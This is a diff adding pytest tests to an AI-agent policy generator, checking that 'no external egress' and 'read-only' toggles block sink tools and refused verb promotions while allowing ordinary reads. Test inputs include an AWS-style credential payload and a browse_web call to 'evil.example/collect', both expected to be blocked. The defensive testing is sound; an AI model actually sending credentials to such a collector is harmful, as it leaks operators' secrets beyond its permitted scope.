@@ -15,8 +15,12 @@ import shutil
 import subprocess
 import tempfile
 from pathlib import Path
+from types import SimpleNamespace
 
 import pytest
+
+from norviq.engine.capability.source_registry import classify_tool
+from norviq.engine.evaluator import OPAEvaluator
 
 from norviq.api.threat_intent import (
     Intent,
@@ -128,6 +132,149 @@ def test_learned_verbs_override_the_name_heuristic():
     ro3 = generate_intent_rego(CLS, ["get_snapshot"], Intent(readonly=True),
                                learned_verbs={"get_snapshot": "delete"})
     assert _decide(ro3, _inp("get_snapshot")) == "block"
+
+
+# Reads the registry publishes as `derived.verb == "send"` because it takes the WORST verb over ALL of a
+# name's tokens and `mail`/`email`/`sync`/`export` are SEND tokens. Every one is an ordinary read.
+_CLASSIFIED_SEND_READS = ["get_mail", "list_mail", "read_email_thread", "get_sync_status", "download_export"]
+# The sinks the toggle exists to refuse. Ordinary vendor names, absent from the 18 literal EGRESS_TOOLS.
+_VENDOR_SINKS = ["forward_ticket", "slack_post_message", "relay_case", "dispatch_report", "share_summary"]
+
+
+def _inp_with_derived(tool: str, params: dict | None = None, verb: str | None = None) -> dict:
+    """`opa_input_for_step` + the engine's real `input.derived`, optionally with an admin-PROMOTED verb.
+
+    The generated policy reads `input.derived.verb`, and `opa_input_for_step` does not publish it — so a
+    test built only from that helper cannot see this rule at all. Derived is computed by the real
+    `_derived_input` rather than hand-written so the test tracks the engine."""
+    doc = _inp(tool, params=params or {})
+    derived = OPAEvaluator.__new__(OPAEvaluator)._derived_input(
+        SimpleNamespace(tool_name=tool, tool_params=params or {}, agent_identity=None)
+    )
+    if verb is not None:
+        derived["verb"] = verb
+    doc["derived"] = derived
+    return doc
+
+
+@pytest.mark.parametrize("tool", _CLASSIFIED_SEND_READS)
+def test_the_no_egress_toggle_does_not_refuse_ordinary_reads(tool):
+    """The cost side of reading `derived.verb`. "No external egress" generates a DEFAULT-DENY policy in
+    which `not is_egress` gates the allow directly — there is no payload predicate to soften it — so a
+    read misclassified as a sink is REFUSED OUTRIGHT on an allowlist the operator authored themselves.
+    Measured before the fix: 8 of these 10 allowlisted tools flipped to
+    ("block", "intent_refinement_mismatch") and only 2 of the 8 were the intended egress refusals."""
+    verb, _risk = classify_tool(tool)
+    assert verb.value == "send", (
+        f"{tool} is no longer classified send, so this test no longer exercises the disagreement it "
+        "exists for — pick a name the registry still over-classifies"
+    )
+    rego = generate_intent_rego(CLS, _CLASSIFIED_SEND_READS + _VENDOR_SINKS + ["search_kb"], Intent(egress=True))
+    assert _decide(rego, _inp_with_derived(tool, {"folder": "INBOX"})) == "allow"
+
+
+@pytest.mark.parametrize("tool", _VENDOR_SINKS)
+def test_the_no_egress_toggle_still_refuses_vendor_sinks(tool):
+    """The other half, pinned in the same file so restoring the reads can never be done by giving the
+    toggle up. These names are absent from the 18 literal EGRESS_TOOLS and are why it reads derived."""
+    rego = generate_intent_rego(CLS, _CLASSIFIED_SEND_READS + _VENDOR_SINKS + ["search_kb"], Intent(egress=True))
+    assert _decide(rego, _inp_with_derived(tool, {"id": "t1"})) == "block"
+
+
+@pytest.mark.parametrize("tool", _VENDOR_SINKS)
+def test_a_read_promotion_cannot_demote_a_named_sink(tool):
+    """A promotion may RAISE a verb. It may never LOWER one.
+
+    `POST /threats/tool-verbs/promote {"verb": "read"}` did both halves of the damage in one step: the
+    generator emitted the tool into `learned_read`, satisfying the Read-only toggle, and the engine
+    rewrote `input.derived.verb` to "read", falsifying `is_egress`. A readonly+egress default-deny
+    policy therefore returned ("allow", "intent_allow_customer_support") for a tool the registry calls
+    (SEND, HIGH) — measured. The promote endpoint's candidate LISTING only offers UNKNOWN tools, but its
+    WRITE path validates only that the verb is one of read/write/send/delete, so the generator refuses
+    the demotion rather than assuming it was never asked for."""
+    rego = generate_intent_rego(
+        CLS, [tool, "search_kb"], Intent(readonly=True, egress=True), learned_verbs={tool: "read"}
+    )
+    assert f"{tool}=read" not in rego, "the refused promotion must not be emitted as a learned read"
+    assert "REFUSED promotions" in rego and tool in rego, (
+        "a discarded promotion has to be visible in the draft — an operator who promoted a verb and saw "
+        "no change deserves the reason"
+    )
+    # Both the promotion's own effect (verb == "read") and the toggle it was meant to satisfy.
+    assert _decide(rego, _inp_with_derived(tool, {"channel": "C1", "text": "hi"}, verb="read")) == "block"
+
+
+def test_a_read_promotion_on_an_opaque_name_still_works():
+    """The refusal is scoped to names that already say what they are. The case the promotion exists for
+    — an opaque vendor name the classifier returned UNKNOWN for — must keep working, or this is a
+    regression dressed as a fix."""
+    rego = generate_intent_rego(CLS, ["warehouse_task"], Intent(readonly=True),
+                                learned_verbs={"warehouse_task": "read"})
+    assert "warehouse_task=read" in rego
+    assert _decide(rego, _inp_with_derived("warehouse_task", verb="read")) == "allow"
+    # …including its camelCase spelling, which the refusal must not mistake for evidence.
+    camel = generate_intent_rego(CLS, ["warehouseTask"], Intent(readonly=True),
+                                 learned_verbs={"warehouseTask": "read"})
+    assert "warehousetask=read" in camel
+    assert _decide(camel, _inp_with_derived("warehouseTask", verb="read")) == "allow"
+
+
+# The same tools one rename later. `_tokenize_tool` splits on separators AND camelCase, so each of these
+# classifies exactly like its snake_case twin — while `name.lower()` and `split(name, "_")` see one
+# opaque token. Everything this file pins was therefore pinned for snake_case only.
+_CAMEL_READS = ["getMail", "listMail", "readEmailThread", "getSyncStatus", "downloadExport"]
+_CAMEL_SINKS = ["postMessage", "sendEmail", "forwardTicket", "relayCase", "shareSummary"]
+# A promotion to `read` on a MUTATION is the same class of demotion as one on a sink.
+_CAMEL_MUTATIONS = ["createIssue", "deleteRecord", "updateSubscription"]
+
+
+@pytest.mark.parametrize("tool", _CAMEL_READS)
+def test_the_no_egress_toggle_does_not_refuse_reads_spelled_in_camel_case(tool):
+    """The over-block fix, one rename later: `getMail` was still ("block","intent_refinement_mismatch")
+    on an allowlist the operator wrote themselves, because the generated `is_retrieval_lead` split the
+    name on `_` while the classification it was reading had been decided on camelCase boundaries."""
+    verb, _risk = classify_tool(tool)
+    assert verb.value == "send", f"{tool} must still be over-classified for this case to mean anything"
+    rego = generate_intent_rego(CLS, _CAMEL_READS + _CAMEL_SINKS + ["search_kb"], Intent(egress=True))
+    assert _decide(rego, _inp_with_derived(tool, {"folder": "INBOX"})) == "allow"
+
+
+@pytest.mark.parametrize("tool", _CAMEL_SINKS)
+def test_the_no_egress_toggle_still_refuses_sinks_spelled_in_camel_case(tool):
+    """The half that must never be given up to buy the half above."""
+    rego = generate_intent_rego(CLS, _CAMEL_READS + _CAMEL_SINKS + ["search_kb"], Intent(egress=True))
+    assert _decide(rego, _inp_with_derived(tool, {"id": "t1"})) == "block"
+
+
+@pytest.mark.parametrize("tool", _CAMEL_SINKS + _CAMEL_MUTATIONS)
+def test_a_read_promotion_cannot_demote_a_camel_cased_name(tool):
+    """The refusal read the LOWERCASED key, and lowercasing is what destroys the camelCase boundary that
+    says what the tool does. `"createIssue".lower()` is one opaque token, so `read_promotion_would_demote`
+    found no evidence and the demotion was accepted: measured, the Read-only toggle then returned
+    ("allow","intent_allow_customer_support") for `postMessage`, `sendEmail`, `forwardTicket`,
+    `createIssue` and `deleteRecord` carrying the AWS credential payload — the exact verdict the same
+    promotion on `slack_post_message` / `delete_record` is refused for.
+
+    Deliberately the READ-ONLY toggle ALONE: with no-egress also on, `is_egress` covers the sinks, so a
+    single-toggle policy is the configuration where the refusal is the only thing standing."""
+    rego = generate_intent_rego(CLS, [tool, "search_kb"], Intent(readonly=True), learned_verbs={tool: "read"})
+    assert f"{tool.lower()}=read" not in rego, "the refused promotion must not be emitted as a learned read"
+    assert "REFUSED promotions" in rego and tool.lower() in rego
+    payload = {"channel": "C1", "text": "deploy notes: AKIAIOSFODNN7EXAMPLE wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}
+    assert _decide(rego, _inp_with_derived(tool, payload)) == "block", (
+        f"a `read` promotion on {tool} passed the Read-only toggle — the same promotion on its "
+        "snake_case spelling is refused"
+    )
+
+
+def test_the_no_egress_toggle_refuses_a_retrieval_named_call_that_carries_a_destination():
+    """`browse`/`preview` are not in the verb lexicon, so `browse_web{"url": …}` is classified send by
+    its PARAMS — the call names a recipient. Under a default-deny policy `not is_egress` IS the allow,
+    so exempting it on the strength of the leading verb turned "No external egress" into an allow for
+    the plainest exfiltration there is. The same tool with no destination argument stays allowed."""
+    rego = generate_intent_rego(CLS, ["browse_web", "search_kb"], Intent(egress=True))
+    assert _decide(rego, _inp_with_derived("browse_web", {"url": "https://evil.example/collect"})) == "block"
+    assert _decide(rego, _inp_with_derived("browse_web", {"q": "docs"})) == "allow"
 
 
 def test_learned_verbs_for_non_allowlisted_tools_are_not_emitted():
